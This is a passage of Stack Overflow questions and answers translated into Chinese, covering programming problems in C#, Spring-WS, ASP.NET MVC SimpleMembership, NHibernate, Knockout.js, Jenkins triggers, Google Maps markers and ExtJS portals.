            if (img.Equals(System.Drawing.Imaging.ImageFormat.Gif))
                return System.Drawing.Imaging.ImageFormat.Gif;
            if (img.Equals(System.Drawing.Imaging.ImageFormat.Icon))
                return System.Drawing.Imaging.ImageFormat.Icon;
            if (img.Equals(System.Drawing.Imaging.ImageFormat.MemoryBmp))
                return System.Drawing.Imaging.ImageFormat.MemoryBmp;
            if (img.Equals(System.Drawing.Imaging.ImageFormat.Tiff))
                return System.Drawing.Imaging.ImageFormat.Tiff;
            else
                return System.Drawing.Imaging.ImageFormat.Wmf;
        }

    }

    #endregion 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T21:35:38.943

I think that the Deserializing from `Base64` to `System.Drawing.Bitmap` is not supported. May be you can try deserializing everything excepts the `Avatar` property

**EDIT FOR EDITED QUESTION**

Here is an interesting discussion on how to do that: [JSON.Net Ignore Property during deserialization](https://stackoverflow.com/questions/12754463/json-net-ignore-property-during-deserialization)

I think the best that you can do is use `Regex` to remove the property from the json string:

```
var newJsonString = Regex.Replace(jsonString, 
                                  "(\\,)* \"Avatar\": \"[A-Za-z0-9]+\"", 
                                  String.Empty); 
```

and then deserialize this `newJsonString` without the Avatar property.

Later you can parse the original json string to get the `base64` and build the `Bitmap`

```
var avatarBase64 = Regex.Match(
                        Regex.Match(json, "(\\,)* \"Avatar\": \"[A-Za-z0-9]+\"")
                             .ToString(), 
                        "[A-Za-z0-9]+", RegexOptions.RightToLeft)
                        .ToString();

...

byte[] fromBase64 = Convert.FromBase64String(avatarBase64);
using (MemoryStream ms = new MemoryStream(fromBase64))
{
    Bitmap img = (Bitmap)Image.FromStream(ms);
    result.Avatar = img;
} 
```

You could improve the regular expressions or the method, but that's the basic idea.

# java - SoapFaultMappingExceptionResolver 永远不会受到常规 java 异常的影响

> ID：15510743
> 
> 赞同：5
> 
> 时间：2013-03-19T21:26:42.740
> 
> 标签：java, spring, exception, soap, spring-ws

谁能告诉我为什么我不能用我的解析器捕获一个常规的 Java 异常，这样我就可以在响应被发回之前对其进行转换？它永远不会被断点击中。如果不可能，我该怎么办？

**SoapFaultMappingExceptionResolver**

```
public class LisSoapFaultTranslatorExceptionResolver extends SoapFaultMappingExceptionResolver {

    @Override
    protected void customizeFault(Object endpoint, Exception ex, SoapFault fault) {

        SoapFaultDetail detail = fault.addFaultDetail();
    }
} 
```

**豆**

```
<sws:annotation-driven />
<bean class="org.springframework.ws.server.endpoint.mapping.PayloadRootAnnotationMethodEndpointMapping" />
<bean id="exceptionResolver"
            class="com.openclass.adapter.ws.resolvers.LisSoapFaultTranslatorExceptionResolver">
            <property name="defaultFault" value="RECEIVER,Server error">
            </property>
            <property name="exceptionMappings">
                <value>java.lang.Exception=SERVER,FaultMsg</value>
        </property>
    </bean> 
```

**带有错误的肥皂响应**

```
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
   <SOAP-ENV:Header/>
   <SOAP-ENV:Body>
      <SOAP-ENV:Fault>
         <faultcode>SOAP-ENV:Server</faultcode>
         <faultstring xml:lang="en">java.lang.NullPointerException</faultstring>
      </SOAP-ENV:Fault>
   </SOAP-ENV:Body>
</SOAP-ENV:Envelope> 
```

**网络服务**

```
@PayloadRoot(localPart="readCourseSectionRequest", namespace="http://www.imsglobal.org/services/lis/cmsv1p0/wsdl11/sync/imscms_v1p0")
    @ResponsePayload
    public ReadCourseSectionResponse readCourseSection(@RequestPayload ReadCourseSectionRequest request, MessageContext messageContext) {

            // Throws error since courseService is null
        ReadCourseSectionResponse openClassResponse = courseService.readCourseSection(request);

        return new ReadCourseSectionResponse();
    } 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-19T22:13:20.210

我通过添加使其工作

```
<property name="order" value="1"></property> 
```

到

```
<bean id="exceptionResolver" class="com.openclass.adapter.ws.resolvers.LisSoapFaultTranslatorExceptionResolver"> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:41:37.960

我认为您应该在您的异常解析器中覆盖方法 getFaultDefinition，如下所示（假设您的解析器正在扩展 AbstractSoapFaultDefinitionExceptionResolver）：

```
@Override
protected SoapFaultDefinition getFaultDefinition(Object endpoint, Exception ex) {
    if(ex instanceof LoginException){
        SoapFaultDefinition result = new SoapFaultDefinition();
        result.setFaultCode(QName.valueOf("SERVER"));
        return result;
    }
    return null;
} 
```

如果您希望您的故障消息（异常）更加自定义，您应该将其注释为：

```
@SoapFault(faultCode = FaultCode.SERVER)
public class LoginException extends Exception{} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-06-26T11:57:55.907

我遇到了类似的问题。我解决了它用“soapFaultAnnotationExceptionResolver”替换bean名称/ id“exceptionResolver”。

请参阅：[在 WS SoapFault 中添加详细信息：未使用我的自定义 ExceptionResolver](https://stackoverflow.com/questions/31069114/custom-soapfault-exception-resolver-not-being-used/31072552#31072552)

# asp.net-mvc - SimpleMembership 首次登录尝试失败

> ID：15510746
> 
> 赞同：1
> 
> 时间：2013-03-19T21:26:45.823
> 
> 标签：asp.net-mvc, asp.net-mvc-4, simplemembership

我的问题是新的 simplemembership 提供程序在第一次尝试时失败了一个好的用户名/密码组合。第一次失败的尝试产生现在包含用户名的 .ASPXAUTH，第二次尝试将使用相同的数据。

我知道这与 .ASPXAUTH cookie b/c 绑定，如果我在第一次（失败）尝试后删除它，那么我会得到相同的结果。最终结果是，除非它在 ​​auth cookie 中有一个与传入的表单用户名匹配的用户名，否则该人需要第二次登录。这与连接数据库或初始化连接 b/c 无关，我每次都可以重现此行为。

想法？

```
[HttpPost]
        [AllowAnonymous]
        //[ValidateAntiForgeryToken]
        [HandleError(View = "AntiForgeryExceptionView", ExceptionType = typeof (HttpAntiForgeryException))]
        public ActionResult Login(LoginModel model, string returnUrl)
        {
            ViewBag.Message = "Login";

            if (ModelState.IsValid && WebSecurity.UserExists(model.UserName))
            {

               WebSecurity.Login(model.UserName, model.Password, model.RememberMe);
                if (WebSecurity.CurrentUserId > 0)
                {
                    if (!IsRegistered(WebSecurity.CurrentUserId))
                    {
                        ModelState.AddModelError("", "You cannot log in before registering.");
                        return View(model);
                    }
                    if (HttpContext.Session != null)
                    {
                        Helpers.MemberService.Set(new MemberSession
                                                      {
                                                          UserId = WebSecurity.CurrentUserId,
                                                          SessionId = HttpContext.Session.SessionID
                                                      });
                    }

                    var cookie = new HttpCookie("MemberId")
                    {
                        Expires = DateTime.Now.AddDays(-1) // or any other time in the past
                    };
                    HttpContext.Response.Cookies.Set(cookie);
                    HttpContext.Response.Cookies.Add(new HttpCookie("UserId", WebSecurity.CurrentUserId.ToString(CultureInfo.InvariantCulture)));
                    if (string.IsNullOrEmpty(returnUrl))
                    {
                        // we can assume the user has just logged on...
                        returnUrl = "../Summary.htm";
                    }
                    return RedirectToAction(returnUrl);
                }
            }

            // If we got this far, something failed, redisplay form
            ModelState.AddModelError("", "The user name or password provided is incorrect.");

            return View(model);
        }

<?xml version="1.0" encoding="utf-8"?>
<!--
  For more information on how to configure your ASP.NET application, please visit
  http://go.microsoft.com/fwlink/?LinkId=169433
  -->
<configuration>
  <configSections>
    <!-- For more information on Entity Framework configuration, visit http://go.microsoft.com/fwlink/?LinkID=237468 -->
    <section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=5.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false" />

    <section name="log4net" type="log4net.Config.Log4NetConfigurationSectionHandler, log4net" />
    <sectionGroup name="dotNetOpenAuth" type="DotNetOpenAuth.Configuration.DotNetOpenAuthSection, DotNetOpenAuth.Core">
      <section name="messaging" type="DotNetOpenAuth.Configuration.MessagingElement, DotNetOpenAuth.Core" requirePermission="false" allowLocation="true" />
      <section name="reporting" type="DotNetOpenAuth.Configuration.ReportingElement, DotNetOpenAuth.Core" requirePermission="false" allowLocation="true" />
      <section name="oauth" type="DotNetOpenAuth.Configuration.OAuthElement, DotNetOpenAuth.OAuth" requirePermission="false" allowLocation="true" />
      <section name="openid" type="DotNetOpenAuth.Configuration.OpenIdElement, DotNetOpenAuth.OpenId" requirePermission="false" allowLocation="true" />
    </sectionGroup>
  </configSections>
  <appSettings configSource="Helpers\Config\appsettings.config" />
  <system.web>
    <compilation debug="true" targetFramework="4.0" />
    <authentication mode="Forms">
      <forms loginUrl="~/Account/Login" timeout="2880" />
    </authentication>
    <pages>
      <namespaces>
        <add namespace="System.Web.Helpers" />
        <add namespace="System.Web.Mvc" />
        <add namespace="System.Web.Mvc.Ajax" />
        <add namespace="System.Web.Mvc.Html" />
        <add namespace="System.Web.Optimization" />
        <add namespace="System.Web.Routing" />
        <add namespace="System.Web.WebPages" />
      </namespaces>
    </pages>
    <trust level="Full" />
  </system.web>
  <system.webServer>
    <validation validateIntegratedModeConfiguration="false" />
    <modules runAllManagedModulesForAllRequests="true" />
    <handlers>
      <remove name="ExtensionlessUrlHandler-ISAPI-4.0_32bit" />
      <remove name="ExtensionlessUrlHandler-ISAPI-4.0_64bit" />
      <remove name="ExtensionlessUrlHandler-Integrated-4.0" />
      <add name="ExtensionlessUrlHandler-ISAPI-4.0_32bit" path="*." verb="GET,HEAD,POST,DEBUG,PUT,DELETE,PATCH,OPTIONS" modules="IsapiModule" scriptProcessor="%windir%\Microsoft.NET\Framework\v4.0.30319\aspnet_isapi.dll" preCondition="classicMode,runtimeVersionv4.0,bitness32" responseBufferLimit="0" />
      <add name="ExtensionlessUrlHandler-ISAPI-4.0_64bit" path="*." verb="GET,HEAD,POST,DEBUG,PUT,DELETE,PATCH,OPTIONS" modules="IsapiModule" scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll" preCondition="classicMode,runtimeVersionv4.0,bitness64" responseBufferLimit="0" />
      <add name="ExtensionlessUrlHandler-Integrated-4.0" path="*." verb="GET,HEAD,POST,DEBUG,PUT,DELETE,PATCH,OPTIONS" type="System.Web.Handlers.TransferRequestHandler" preCondition="integratedMode,runtimeVersionv4.0" />
    </handlers>
  </system.webServer>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Helpers" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-2.0.0.0" newVersion="2.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Mvc" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="0.0.0.0-4.0.0.0" newVersion="4.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.WebPages" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="0.0.0.0-2.0.0.0" newVersion="2.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="StructureMap" publicKeyToken="e60ad81abae3c223" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-2.6.4.0" newVersion="2.6.4.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="EntityFramework" publicKeyToken="b77a5c561934e089" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-5.0.0.0" newVersion="5.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="DotNetOpenAuth.AspNet" publicKeyToken="2780ccd10d57b246" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-4.1.0.0" newVersion="4.1.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="DotNetOpenAuth.Core" publicKeyToken="2780ccd10d57b246" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-4.1.0.0" newVersion="4.1.0.0" />
      </dependentAssembly>
    </assemblyBinding>
    <legacyHMACWarning enabled="0" />
  </runtime>
  <entityFramework>
    <defaultConnectionFactory type="System.Data.Entity.Infrastructure.SqlConnectionFactory, EntityFramework" />
  </entityFramework>
  <system.net>
    <defaultProxy enabled="true" />
    <settings>
      <!-- This setting causes .NET to check certificate revocation lists (CRL) 
                 before trusting HTTPS certificates.  But this setting tends to not 
                 be allowed in shared hosting environments. -->
      <!--<servicePointManager checkCertificateRevocationList="true"/>-->
    </settings>
  </system.net>
  <dotNetOpenAuth>
    <messaging>
      <untrustedWebRequest>
        <whitelistHosts>
          <!-- Uncomment to enable communication with localhost (should generally not activate in production!) -->
          <!--<add name="localhost" />-->
        </whitelistHosts>
      </untrustedWebRequest>
    </messaging>
    <!-- Allow DotNetOpenAuth to publish usage statistics to library authors to improve the library. -->
    <reporting enabled="true" />
    <openid>
      <relyingParty>
        <security requireSsl="false">
          <!-- Uncomment the trustedProviders tag if your relying party should only accept positive assertions from a closed set of OpenID Providers. -->
          <!--<trustedProviders rejectAssertionsFromUntrustedProviders="true">
                        <add endpoint="https://www.google.com/accounts/o8/ud" />
                    </trustedProviders>-->
        </security>
        <behaviors>
          <!-- The following OPTIONAL behavior allows RPs to use SREG only, but be compatible
                         with OPs that use Attribute Exchange (in various formats). -->
          <add type="DotNetOpenAuth.OpenId.RelyingParty.Behaviors.AXFetchAsSregTransform, DotNetOpenAuth.OpenId.RelyingParty" />
        </behaviors>
      </relyingParty>
    </openid>
  </dotNetOpenAuth>
  <uri>
    <!-- See an error due to this section?  When targeting .NET 3.5, please add the following line to your <configSections> at the top of this file:
        <section name="uri" type="System.Configuration.UriSection, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
        -->
    <!-- The uri section is necessary to turn on .NET 3.5 support for IDN (international domain names),
         which is necessary for OpenID urls with unicode characters in the domain/host name. 
         It is also required to put the Uri class into RFC 3986 escaping mode, which OpenID and OAuth require. -->
    <idn enabled="All" />
    <iriParsing enabled="true" />
  </uri>
  <log4net>
    <appender name="GeneralLog" type="log4net.Appender.RollingFileAppender">
      <!--<file value="${TEMP}\\Logs\\AppName_${COMPUTERNAME} " />-->
      <file value="Logs\\WebLog.log" />
      <appendToFile value="true" />
      <rollingStyle value="Composite" />
      <staticLogFileName value="false" />
      <datePattern value=".yyyyMMdd.'log'" />
      <maxSizeRollBackups value="10" />
      <maximumFileSize value="5MB" />
      <lockingModel type="log4net.Appender.FileAppender+MinimalLock" />
      <layout type="log4net.Layout.PatternLayout">
        <conversionPattern value="%d{HH:mm:ss.fff} [%t] %-5p %c - %m%n" />
      </layout>
    </appender>
    <appender name="DebugAppender" type="log4net.Appender.DebugAppender">
      <layout type="log4net.Layout.PatternLayout">
        <conversionPattern value="%d [%t] %-5level %logger - %message%newline" />
      </layout>
    </appender>
    <root>
      <level value="ALL" />
      <appender-ref ref="GeneralLog" />
      <appender-ref ref="DebugAppender" />
    </root>
  </log4net>
</configuration> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T22:14:20.950

我认为您缺少以下行来验证当前请求的 cookie：

```
FormsAuthentication.SetAuthCookie(userName, createPersistentCookie); 
```

**编辑：**

您使用的是新的 WebSecurity 安全模型，而不是表单身份验证。忽略我的第一个答案。

`WebSecurity.CurrentUserId`登录后可以查看里面的内容吗？我认为 WebSecutiy 的属性不会在调用`Login`. 如果您在调用后发送第二个请求，`Login`您应该会看到`CurrentUserId`已设置。

如果您想在继续之前检查是否成功登录，您可以执行以下操作：

```
bool isLoggedIn = WebSecurity.Login(model.UserName, model.Password, model.RememberMe);
if (isLoggedIn) {
    ....
} 
```

# nhibernate - Nhibernate：如何用一对多关系表示多对多关系？

> ID：15510748
> 
> 赞同：5
> 
> 时间：2013-03-19T21:26:50.543
> 
> 标签：nhibernate

我在互联网上读过一篇帖子（我再也找不到那个帖子供我参考），多对多关系可以用一对多关系代替。有人可以提供一个例子吗？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-05-30T03:55:44.467

我刚提出这个问题，并意识到缺少任何答案。很遗憾，虽然我经常指出这个 NHibernate 文档声明：[24\. 最佳实践](http://nhibernate.info/doc/nh/en/index.html#best-practices)

**不要使用奇异的关联映射。**

> 真正多对多关联的良好用例很少见。大多数时候，您需要存储在“链接表”中的附加信息。在这种情况下，最好使用两个一对多关联到一个中间链接类。事实上，我们认为大多数关联都是一对多和多对一的，在使用任何其他关联方式时要小心，并问问自己是否真的有必要。

看看[23.2下的例子。作者/作品](http://nhibernate.info/doc/nh/en/index.html#example-mappings-authorwork)。`Author`提取和之间的多对多关系的简化版本`Work`：

```
<class name="Work" table="works" ...>
        <id name="Id" column="id" generator="native" />
        ...
        <set name="Authors" table="author_work" lazy="true">
            <key>
                <column name="work_id" not-null="true"/>
            </key>
            <many-to-many class="Author">
                <column name="author_id" not-null="true"/>
            </many-to-many>
        </set>
</class> 
```

及其多对多目标作者：

```
<class name="Author" table="authors">
  ...
  <set name="Works" table="author_work" inverse="true" lazy="true">
     <key column="author_id"/>
     <many-to-many class="Work" column="work_id"/>
  </set>
</class> 
```

所以，如果我们想在加载时订购一组作品，我们确实遇到了问题。对表中没有列。但更重要的是，没有办法管理这样的列。

我们能做的，就是引入 Pair 对象：`AuthorWork`并根据需要扩展 Pair 表

```
public class AuthorWork
{

    public virtual Author Author { get; set; }
    public virtual Work Work { get; set; }
    public virtual int OrderBy { get; set; }
} 
```

AuthorWork 的映射

```
<class name="AuthorWork" table="author_work">
    ...
    <many-to-one name="Author" column="author_id" />
    <many-to-one name="Workr"  column="work_id" />
    <property name="OrderBy" /> 
```

有了这个，我们可以将多对多映射转换为一对多，例如 Authors 集合：

```
<set name="Authors" lazy="true"
  order-by="OrderBy">
  <key column="work_id" not-null="true"/>
  <one-to-many class="AuthorWork" />
</set> 
```

我们可以管理实体 AuthorWork，设置 OrderBy 列，从而有效地使用配对表。

*注意：必须同意文档中的建议越多的要求，我们就越高兴我们确实有办法管理关系！*

# knockout.js - 动态类 + foreach + css + 淘汰赛

> ID：15510749
> 
> 赞同：1
> 
> 时间：2013-03-19T21:26:53.257
> 
> 标签：knockout.js

我需要根据 foreach 中的值附加一个动态类。

这是HTML：

```
<tbody data-bind="foreach: Tenancies">
    <tr data-bind="css: $parent.CurrentTenancy(date1, date2)">
        <td>blah</td>
    </tr>
</tbody> 
```

这是JS：

```
self.CurrentTenancy = function(startDate, endDate) {
    var now = Models.Format.Date(new Date());

    if (now < startDate) {
        return "past";
    }

    if (now > endDate) {
        return "future";
    }

    return "current";
}; 
```

最后，我得到了 0 1 2 3 作为类的类属性。

# jenkins - Jenkins：我如何使用参数化触发器插件并通过颠覆修订？

> ID：15510754
> 
> 赞同：19
> 
> 时间：2013-03-19T21:27:00.370
> 
> 标签：jenkins, jenkins-plugins

IMO，这个用例确实需要在插件的网页/文档上特别说明。

假设我有一个名为 U 代表上游和 D 代表下游的项目。当 U 完成构建时，我希望 D 签出 U 刚刚构建的相同版本。您将始终结帐 HEAD。

这是我所做的：

1.  在 U 中，我为“在其他项目上触发参数化构建”添加了“构建后操作”。
2.  对于“要构建的项目”，我输入了 D 并且仅在“稳定”时构建。
3.  我为“Subversion revision”添加了一个触发器。
4.  我保存了这个配置

现在我不知道接下来我应该做什么，但我没有收到任何*反馈*表明这是有效的。事实上，[即使这个提交给插件源的测试用例也](https://github.com/jenkinsci/parameterized-trigger-plugin/blob/master/src/test/java/hudson/plugins/parameterizedtrigger/test/SubversionRevisionBuildTriggerConfigTest.java)表明这就是我应该做的。

但是，如果我猜的话，我想我应该将 U 标记为参数化构建并为其添加一个参数。这个参数应该命名为 U 发送给 D 的内容。但是，如果我有正确的想法，我不知道应该如何命名这个参数。D 的控制台日志和 U 的控制台日志都没有提到任何新参数。

我猜测并在 U 中创建了一个名为“SVN_REVISION”的字符串参数，并将其默认为 -1，但这没有任何效果。每次 D 触发构建时，SVN_REVISION 默认为 -1。

* * *

这是在`export`D 项目上运行的输出：

```
+ export
export BUILD_ID="2013-03-20_09-48-32"
export BUILD_NUMBER="4522"
export BUILD_TAG="jenkins-D-4522"
export BUILD_URL="http://my.jenkins.server.com:8081/job/D/4522/"
export EXECUTOR_NUMBER="2"
export HUDSON_COOKIE="8ec52f7a-d60d-4640-83a9-dbed7351b32a"
export HUDSON_HOME="/opt/hudson"
export HUDSON_SERVER_COOKIE="633967fcd1d6f7b38a85042ada5c3949"
export HUDSON_URL="http://my.jenkins.server.com:8081/"
export JAVA_HOME="/opt/java"
export JENKINS_HOME="/opt/hudson"
export JENKINS_SERVER_COOKIE="633967fcd1d6f7b38a85042ada5c3949"
export JENKINS_URL="http://my.jenkins.server.com:8081/"
export JOB_NAME="D"
export JOB_URL="http://my.jenkins.server.com:8081/job/D/"
export LANG="en_US.UTF-8"
export LD_LIBRARY_PATH="/opt/jdk1.6.0_30/jre/lib/i386/server:/opt/jdk1.6.0_30/jre/lib/i386:/opt/jdk1.6.0_30/jre/../lib/i386"
export M2="/opt/maven/bin"
export M2_HOME="/opt/maven"
export MAVEN_OPTS="-Xms256m -Xmx512m"
export NHINC_PROPERTIES_DIR="/opt/nhinc/Properties"
export NLSPATH="/usr/dt/lib/nls/msg/%L/%N.cat"
export NODE_LABELS="master"
export NODE_NAME="master"
export OLDPWD
export PATH="/sbin:/usr/sbin:/bin:/usr/bin:/opt/java/bin:/opt/apache-ant-1.8.1/bin:/usr/local/bin:/opt/maven/bin"
export PWD="/opt/hudson/jobs/D/workspace"
export SHLVL="2"
export SVN_REVISION="24186"
export SVN_URL="https://a/url/trunk"
export TERM="xterm"
export WORKSPACE="/opt/hudson/jobs/D/workspace"
export XFILESEARCHPATH="/usr/dt/app-defaults/%L/Dt"
export _="/opt/java/bin/java" 
```

所以看起来它有一个 SVN_REVISION 环境变量。但我认为这不一定来自插件。我的证据来自詹金斯对“存储库 URL”的描述：

> 在构建过程中，已签出的模块的修订号可通过环境变量 SVN_REVISION 获得，前提是您只签出一个模块。如果您检查了多个模块，请使用 svnversion 命令。如果您有多个模块签出，您可以使用 svnversion 命令获取修订信息，或者您可以使用 SVN_REVISION_ 环境变量，其中 1 是与配置的位置匹配的基于 1 的索引。这些 URL 可通过类似的 SVN_URL_ 环境变量获得。

但是让我们假设这是从 U 而不是 D 设置的。我如何让 D 使用它，或者当 D 被触发时我怎么知道它正在使用它？

* * *

让我问一个我接下来可能需要问的问题。一旦我知道我需要使用的参数的名称，我该如何修改 D 的配置以便它检查该修订？我是否修改“存储库 URL”以将 a`@${PARAMETER_NAME}`放在末尾或其他什么地方？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-20T07:41:41.523

我不知道为什么“Subversion revision”参数不起作用（请参阅下面的故障排除提示），但尝试在“Trigger parameterized build on other projects”下使用“Add parameter”下拉菜单手动添加参数。最简单的可能是添加“当前构建参数”。

您也可以使用“预定义参数”指定所需的参数，可能像这样：

```
SVN_REVISION=${SVN_REVISION} 
```

* * *

不需要将 D 标记为参数化，这仅意味着您可以使用默认值指定参数，并让 Jenkins 在手动触发构建时询问参数。但是任何安排新构建的东西（如参数化触发器插件）总是可以向该构建添加任何参数，无论作业如何配置。

* * *

故障排除提示：添加构建步骤以在触发的构建中转储环境变量（也应具有所有构建参数）。最简单的方法是添加“执行 shell”/“执行 Windows 批处理命令”以及转储环境的命令（`export`使用 unix shell，`set`使用 Windows）。

然后从构建控制台输出中，查看参数是否与它们应有的一样（存在并具有正确的值）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-05-15T18:08:13.757

事实证明，[就像测试用例所说的那样](https://github.com/jenkinsci/parameterized-trigger-plugin/blob/master/src/test/java/hudson/plugins/parameterizedtrigger/test/SubversionRevisionBuildTriggerConfigTest.java)，这就是我所要做的。我通过提交给 U 来测试它，然后在它构建时再次提交。一旦 D 开始构建，它会抓取第一个提交，而不是最新的。这就是我测试它是否有效的方式。

更好的反馈将不胜感激，但至少我知道它是有效的。

# asp.net-mvc - 使用 [HttpGet] 时，AppDomain 重新启动后第一次请求时未找到 ASP.NET MVC 操作

> ID：15510758
> 
> 赞同：1
> 
> 时间：2013-03-19T21:27:04.157
> 
> 标签：asp.net-mvc, forms-authentication

我有一个使用 [HttpGet] 的公共 ASP.NET MVC 操作，如下所示：

```
[HttpGet]
public ActionResult List(OrganizationFilterModel p_model) {
    ...
} 
```

如果用户请求的页面没有有效的用户会话，我们会将他们重定向到登录页面。登录系统在他们登录后将他们重定向到最初请求的 URL。

在此页面上，在某些情况下，从登录系统重定向到原始 URL 会导致抛出异常：

*在控制器“MyApp.Controllers.OrganizationController”上找不到公共操作方法“List”。*但是，**如果我只是重新请求该页面，那么它会成功显示并且对于所有后续请求。**

条件及其他说明：

1.  用户拥有有效的 FormsAuth 票证。[*意思是，他们最近登录*]
2.  由于过期或 AppDomain 重置，用户的会话消失了。
3.  删除`[HttpGet]`修复问题。[*即使失败的请求是 GET* ]

在这些情况下，`[HttpGet]`过滤器的存在会阻止 MVC 找到操作，但仅在第一个请求时。所有后续请求都可以正常工作。

Fiddler 显示以下模式：

*   GET to /Organization/List -->*返回 302 到登录页面*
*   获取/帐户/登录
*   POST 到 /Account/Login [*用户登录，然后被重定向*]
*   GET for /Organization/List -->*抛出错误*
*   GET for /Organization/List -->*如果我重复请求，它工作正常*

**摘要：**过滤器阻止了`[HttpGet]`该操作的定位，但仅限于第一个请求并且尽管它*是*一个 GET 请求。

这是怎么回事？

**更新：** 添加一些附加信息：

1.  使用 MVC 4
2.  我们使用 FormsAuth 但不使用该`[Authorize]`属性。如果请求经过身份验证，我们有自定义代码`OnActionExecuting`强制登录，但没有有效的会话。（*我们实际上只是将 FormsAuth 用于一些静态便捷方法和配置设置*）
3.  如果 FormsAuth 导致重定向到登录页面，则不会发生此问题。如果我们的自定义代码导致重定向，则会出现此问题。
4.  完全删除 FormsAuth 也可以解决此问题。

由于删除 FormsAuth 解决了这个问题，而且我们已经想这样做一段时间了，我将停止故障排除。我真的很想知道这是否是 FormsAuth + MVC [或 FormsAuth + Routing] 中的缺陷，或者我是否做了一些愚蠢的事情。

# google-maps-api-3 - Marker 对象的子类在 v. 3.10 中不再有效

> ID：15510764
> 
> 赞同：1
> 
> 时间：2013-03-19T21:27:17.983
> 
> 标签：google-maps-api-3

通过使用以下语法创建自定义标记，我有一个应用程序运行良好一段时间：

```
MoPin.prototype = new google.maps.Marker();

function MoPin(transmitterID, position, map, title, pinColor, visible, etc,) {
this.title = title;
this.position = position;
this.visible = true;
this.status = status;
this.transmitter = transmitterID;
this.pinColor = pinColor;
etc. 
```

当被迫升级到 v. 3.10/3.11 时，这不再有效。这令人沮丧，因为单步执行脚本似乎已创建并正确填充了对象，并且脚本不会引发错误，但是当我完成后，这些自定义标记都不会显示在地图上。

如果我替换常规标记（var pin = new google.maps.Marker{values}），标记显示正常。

我注意到子类没有创建使用常规标记创建的属性“M”。属性“M”是一个具有各种属性的对象，对我来说毫无意义。这可能是问题吗？

# javascript - 在 EXTJS 的选项卡面板中添加 PORTAL：使用 EXTJS 的门户演示

> ID：15510765
> 
> 赞同：1
> 
> 时间：2013-03-19T21:27:20.937
> 
> 标签：javascript, tabs, extjs4, portal

我目前正在使用 EXTjs 的默认 Portal Demo.. [http://docs.sencha.com/ext-js/4-2/extjs-build/examples/portal/portal.html](http://docs.sencha.com/ext-js/4-2/extjs-build/examples/portal/portal.html)

谁能告诉我我们是否可以制作一个具有 3 个选项卡的居中 TabPanel，并且每个选项卡内部都有一个 Portal。

所以在页面加载时，我们在选项卡 1 上。它本质上是一个门户，我可以在其中拖放东西。选项卡 2 相同。

在 ExtJs 提供的 portal.js 中，我们有用于创建`portalpanel`. 一切正常，但现在我必须有一个 Tabpanel 而不是门户面板，本质上是一个 tabpanel 中的门户面板。

显示的代码`portalpanel`是：

```
 Ext.define('Ext.app.Portal', {
    extend: 'Ext.container.Viewport',
    uses: ['Ext.app.PortalPanel', 'Ext.app.PortalColumn', 'Ext.app.GridPortlet', 'Ext.app.ChartPortlet'],
    initComponent: function(){
var content = '<div class="portlet-content">'+Ext.s.shortBogusMarkup+'</div>';
        Ext.apply(this, {
            id: 'app-viewport',
            layout: {
                type: 'border',
                padding: '0 5 5 5'
            },
            items: [{
                id: 'app-header',
                xtype: 'box',
                region: 'north',
                height: 40,
                html: '<div></div>'
            },{
                xtype: 'container',
                region: 'center',
                layout: 'border',
                items: [{
                    id: 'app-options',
                    title: 'All Widgets',
                    region: 'west',
                    animCollapse: true,
                    width: 200,
                    minWidth: 150,
                    maxWidth: 400,
                    split: true,
                    collapsible: true,
                    layout: 'accordion',
                    layoutConfig:{
                        animate: true
                    },
                    items: [{
                        html: '<div class="portlet-content">'+Ext.s.example+'</div>',
                        title:'Tables',
                        autoScroll: true,
                        border: false,
                        iconCls: 'nav'
                    },
               {
                    id: 'app-portal',
                    xtype: 'portalpanel',
                    region: 'center',
                    items: [{
                        id: 'col-1',
                        items: [{
                            id: 'portlet-1',
                            title: 'Grid Portlet',
                            tools: this.getTools(),
                            items: Ext.create('Ext.app.GridPortlet'),
                            listeners: {
                                'close': Ext.bind(this.onPortletClose, this)
                            }
                        },{
                            id: 'portlet-2',
                            title: 'Portlet 2',
                            tools: this.getTools(),
                            html: content,
                            listeners: {
                                'close': Ext.bind(this.onPortletClose, this)
                            }
                        }]
                    },{
                        id: 'col-2',
                        items: [{
                            id: 'portlet-3',
                            title: 'Portlet 3',
                            tools: this.getTools(),
                            html: '<div class="portlet-content">'+Ext.smartdashboard.bogusMarkup+'</div>',
                            listeners: {
                                'close': Ext.bind(this.onPortletClose, this)
                            }
                        }]
                    },{
                        id: 'col-3',
                        items: [{
                            id: 'portlet-4',
                            title: 'Stock Portlet',
                            tools: this.getTools(),
                            items: Ext.create('Ext.app.ChartPortlet'),
                            listeners: {
                                'close': Ext.bind(this.onPortletClose, this)
                            }
                        }]
                    }]
                } 
```

